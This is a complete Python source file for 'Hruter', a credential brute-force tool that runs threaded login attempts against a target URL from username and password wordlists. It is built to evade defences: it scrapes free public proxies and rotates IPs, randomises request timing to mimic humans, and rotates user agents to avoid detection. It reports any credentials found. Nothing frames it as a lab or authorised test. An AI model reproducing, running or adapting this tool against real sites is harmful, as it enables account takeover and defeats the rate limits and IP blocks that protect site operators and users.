#!/usr/bin/env python3
"""
Hruter - Smart Brute Force Tool v1.1
Avoids IP blocking through random timing and automatic proxy rotation.
Supports dual wordlists (usernames and passwords) and CLI-first control.
"""

import requests
import time
import random
import json
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import logging
from typing import List, Dict, Optional, Tuple, Set, Any
import threading
import sys
import re
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bruteforce.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ProxyManager:
    """Manages automatic proxy fetching, validation, and rotation"""
    def __init__(self, rotate_interval: int = 0, custom_proxies: Optional[List[str]] = None):
        self.rotate_interval = rotate_interval
        self.proxies: List[str] = custom_proxies if custom_proxies else []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.stop_rotation = threading.Event()
        self.last_fetch_time: float = 0.0
        
        if not self.proxies:
            self.fetch_proxies()
            
        if self.rotate_interval > 0:
            self.rotation_thread = threading.Thread(target=self._rotation_loop, daemon=True)
            self.rotation_thread.start()

    def fetch_proxies(self) -> List[str]:
        """Fetch free proxies from multiple public sources"""
        if time.time() - self.last_fetch_time < 300 and self.proxies:
            return self.proxies

        logger.info("Fetching free proxies for IP rotation...")
        new_proxies = []
        sources = [
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/",
            "https://www.us-proxy.org/"
        ]
        
        for url in sources:
            try:
                # Use a specific session for proxy fetching to avoid dependency on current proxy
                response = requests.get(url, timeout=10)
                matches = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", response.text)
                new_proxies.extend(matches)
            except Exception as e:
                logger.debug(f"Failed to fetch from {url}: {e}")
        
        with self.lock:
            unique_proxies = list(set(new_proxies + self.proxies))
            if unique_proxies:
                self.proxies = unique_proxies
                self.last_fetch_time = time.time()
                logger.info(f"Proxy pool updated: {len(self.proxies)} proxies available.")
            else:
                logger.warning("No proxies found. Attack will continue without IP rotation.")
        
        return self.proxies

    def _rotation_loop(self):
        """Background thread for timed IP rotation"""
        while not self.stop_rotation.is_set():
            time.sleep(self.rotate_interval)
            with self.lock:
                if self.proxies:
                    self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
                    logger.info(f"IP ROTATION: Switched to proxy {self.proxies[self.current_proxy_index]}")
            
            if time.time() - self.last_fetch_time > 1800: # Every 30 mins
                self.fetch_proxies()

    def get_proxy(self) -> Optional[Dict[str, str]]:
        """Get the current active proxy in requests format"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.current_proxy_index]
            return {
                'http': f"http://{proxy}",
                'https': f"http://{proxy}"
            }

    def stop(self):
        self.stop_rotation.set()

class SmartBruteForcer:
    def __init__(self, config: Dict, proxy_manager: Optional[ProxyManager] = None):
        self.config = config
        self.session = requests.Session()
        self.proxy_manager = proxy_manager
        self.lock = threading.Lock()
        self.attempts = 0
        self.successful = False
        self.result = None
        self.verbose = config.get('verbose', False)
        self.base_url = config['target_url']
        self.user_field = config.get('username_field', 'username')
        self.pass_field = config.get('password_field', 'password')
        self.payload_raw = config.get('payload_raw') # Hydra-style raw data with ^USER^ and ^PASS^
        self.success_str = config.get('success_string')
        self.failure_str = config.get('failure_string')
        self.max_retries = config.get('max_retries', 3)
        
        if config.get('headers'):
            self.session.headers.update(config['headers'])
    
    def get_random_delay(self) -> float:
        """Generate random delay between requests to mimic human behavior"""
        min_delay = float(self.config.get('min_delay', 1.0))
        max_delay = float(self.config.get('max_delay', 5.0))
        return random.uniform(min_delay, max_delay)
    
    def rotate_user_agent(self) -> str:
        """Rotate user agent to avoid detection"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        return random.choice(user_agents)
    
    def make_request(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Make a single authentication attempt with retries"""
        for retry in range(self.max_retries):
            proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
            user_agent = self.rotate_user_agent()
            
            # Prepare data
            post_data = None
            if self.payload_raw is not None:
                # Replace placeholders in raw string
                post_data = str(self.payload_raw).replace('^USER^', username).replace('^PASS^', password)
            else:
                # Standard key-value mapping
                post_data = self.config.get('payload_template', {}).copy()
                post_data[self.user_field] = username
                post_data[self.pass_field] = password
            
            headers = self.session.headers.copy()
            headers['User-Agent'] = user_agent
            
            try:
                response = self.session.post(
                    self.base_url,
                    data=post_data,
                    headers=headers,
                    proxies=proxy,
                    timeout=self.config.get('timeout', 15),
                    allow_redirects=True
                )
                
                with self.lock:
                    self.attempts += 1
                
                is_success = False
                
                # Success/Failure detection logic
                # 1. User defined Success String (Hydra S= behavior)
                if self.success_str:
                    if str(self.success_str).lower() in response.text.lower():
                        is_success = True
                
                # 2. User defined Failure String (Hydra F= behavior)
                elif self.failure_str:
                    if str(self.failure_str).lower() not in response.text.lower():
                        is_success = True
                
                # 3. Default Heuristics (Redirect/URL change)
                else:
                    # Check redirection history
                    if response.history:
                        for hist_resp in response.history:
                            if hist_resp.status_code in [301, 302, 303, 307, 308]:
                                final_location = response.url.lower()
                                if 'login' not in final_location or 'dashboard' in final_location or 'user' in final_location:
                                    is_success = True
                                    break
                    
                    if not is_success and response.url.rstrip('/') != self.base_url.rstrip('/'):
                        if 'login' not in response.url.lower() or 'dashboard' in response.url.lower():
                            is_success = True

                if self.verbose:
                    status = "[*]" # Simpler indicator, focus on details
                    length = len(response.text)
                    # url - user - pass - status [code, size]
                    print(f"{self.base_url} - {username} - {password} - {status} [Code: {response.status_code}, Size: {length}]")

                if is_success:
                    return True, {'username': username, 'password': password}

                return False, {}
                
            except Exception as e:
                if retry == self.max_retries - 1:
                    logger.debug(f"Final retry failed for {username}:{password}: {e}")
                else:
                    time.sleep(1) # Short sleep before retry
                    
        return False, {}
    
    def test_connection(self) -> bool:
        """Test reachability and establish initial session cookies"""
        try:
            logger.info(f"Testing connection to {self.base_url}...")
            # Visit the login page first to get cookies/tokens
            response = self.session.get(
                self.base_url,
                timeout=15,
                headers={'User-Agent': self.rotate_user_agent()}
            )
            
            if response.status_code == 200:
                logger.info(f"Target reachable. Initial cookies established: {dict(self.session.cookies)}")
                return True
            else:
                logger.warning(f"Target returned status {response.status_code}")
                return True # Try anyway
        except Exception as e:
            logger.error(f"Target connection failed: {e}")
            return False
    
    def bruteforce(self, usernames: List[str], passwords: List[str], max_workers: int = 3):
        """Execute brute force attack across all combinations"""
        if not self.test_connection():
            return None
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for username in usernames:
                if self.successful: break
                for password in passwords:
                    if self.successful: break
                    future = executor.submit(self.make_request, username, password)
                    futures[future] = (username, password)
            
            for future in as_completed(futures):
                try:
                    success, result = future.result()
                    if success:
                        with self.lock:
                            self.successful = True
                            self.result = result
                        # Cancel remaining tasks
                        for f in futures:
                            if not f.done(): f.cancel()
                        break
                except Exception as e:
                    logger.debug(f"Task failed: {e}")
        
        return self.result

def load_list(path: str, label: str = "items") -> List[str]:
    """Load items from a wordlist file"""
    try:
        if not path or not os.path.isfile(path):
            return []
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            items = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(items)} {label} from {path}")
        return items
    except Exception as e:
        logger.error(f"Error loading {path}: {e}")
        return []

def print_banner():
    banner = r"""
    \033[1;31m  _  _             _              
    | || | _ _  _  _ | |_  ___  _ _ 
    | __ || '_|| || ||  _|/ -_)| '_|
    |_||_||_|   \_,_| \__|\___||_|  
    \033[1;37m      Smart Brute Force Tool v1.1
    \033[0m"""
    print(banner)

def get_cli_input():
    """Interactive CLI prompts for configuration"""
    print("=" * 60)
    print("     HRUTER - INTERACTIVE MODE")
    print("=" * 60)
    
    target_url = input("\n[1] Target login URL: ").strip()
    user_input = input("[2] Username OR path to username list: ").strip()
    pass_wordlist = input("[3] Path to password wordlist: ").strip()
    
    rotate_interval = int(input("\n[4] IP rotation interval (seconds, 0 to disable): ").strip() or "0")
    threads = int(input("[5] Threads (default 3): ").strip() or "3")
    verbose = input("[6] Enable verbose output? (y/N): ").lower() == 'y'
    
    config = {
        "target_url": target_url,
        "username_field": "username",
        "password_field": "password",
        "payload_template": {"username": "", "password": "", "submit": "Login"},
        "success_indicators": ["dashboard", "welcome"],
        "failure_indicators": ["invalid", "error"],
        "min_delay": 1.0,
        "max_delay": 5.0,
        "timeout": 30,
        "verbose": verbose
    }
    
    return {
        'config': config,
        'username': user_input if not os.path.isfile(user_input) else None,
        'userlist': user_input if os.path.isfile(user_input) else None,
        'wordlist': pass_wordlist,
        'rotate_interval': rotate_interval,
        'threads': threads
    }

def main():
    print_banner()
    parser = argparse.ArgumentParser(description='Hruter - Smart Brute Force Tool')
    parser.add_argument('--cli', action='store_true', help='Interactive mode')
    parser.add_argument('--url', help='Target URL')
    parser.add_argument('-u', '--username', help='Single username')
    parser.add_argument('-U', '--userlist', help='Username wordlist')
    parser.add_argument('-w', '--wordlist', help='Password wordlist')
    parser.add_argument('-r', '--rotate-interval', type=int, default=0, help='IP rotation (secs)')
    parser.add_argument('-c', '--config', default='bruteforce_config.json', help='Config file')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Threads')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--user-field', default='username', help='Username field name')
    parser.add_argument('--pass-field', default='password', help='Password field name')
    parser.add_argument('-S', '--success-string', help='String indicating success')
    parser.add_argument('-F', '--failure-string', help='String indicating failure')
    parser.add_argument('--retries', type=int, default=3, help='Max retries per attempt')
    parser.add_argument('--payload', help='Raw POST payload with ^USER^ and ^PASS^ placeholders')
    
    args = parser.parse_args()
    
    # Load configuration
    config: Dict[str, Any] = {}
    if os.path.exists(args.config):
        try:
            with open(args.config, 'r') as f:
                loaded_config = json.load(f)
                if isinstance(loaded_config, dict):
                    config = loaded_config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")

    if args.cli or (not (args.username or args.userlist) and not args.wordlist):
        data = get_cli_input()
        if not data: return
        config.update(data['config'])
        usernames = [data['username']] if data['username'] else load_list(data['userlist'], "usernames")
        passwords = load_list(data['wordlist'], "passwords")
        rotate_interval = data['rotate_interval']
        threads = data['threads']
    else:
        if args.url: config['target_url'] = args.url
        usernames = [args.username] if args.username else load_list(args.userlist, "usernames")
        passwords = load_list(args.wordlist, "passwords")
        rotate_interval = int(args.rotate_interval)
        threads = int(args.threads)
        config.update({
            'verbose': bool(args.verbose),
            'username_field': str(args.user_field),
            'password_field': str(args.pass_field),
            'success_string': args.success_string,
            'failure_string': args.failure_string,
            'max_retries': int(args.retries),
            'payload_raw': args.payload
        })

    if not usernames or not passwords or not config.get('target_url'):
        logger.error("Missing required parameters (URL, Users, Passwords).")
        return

    proxy_manager = ProxyManager(rotate_interval=rotate_interval)
    
    print("\n" + "=" * 60)
    print("     HRUTER - ATTACK SUMMARY")
    print("=" * 60)
    print(f"Target: {config['target_url']}")
    print(f"Users : {len(usernames)}")
    print(f"Passes: {len(passwords)}")
    print(f"IP Rot: {rotate_interval}s" if rotate_interval > 0 else "IP Rot: Disabled")
    print("=" * 60)
    
    if input("\n[!] Start attack? (y/N): ").lower() != 'y':
        proxy_manager.stop()
        return

    brute_forcer = SmartBruteForcer(config, proxy_manager)
    try:
        result = brute_forcer.bruteforce(usernames, passwords, threads)
        if result:
            print(f"\n[+] CREDENTIALS FOUND: {result['username']}:{result['password']}")
        else:
            print("\n[-] No valid credentials found.")
    finally:
        proxy_manager.stop()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
        sys.exit(0)
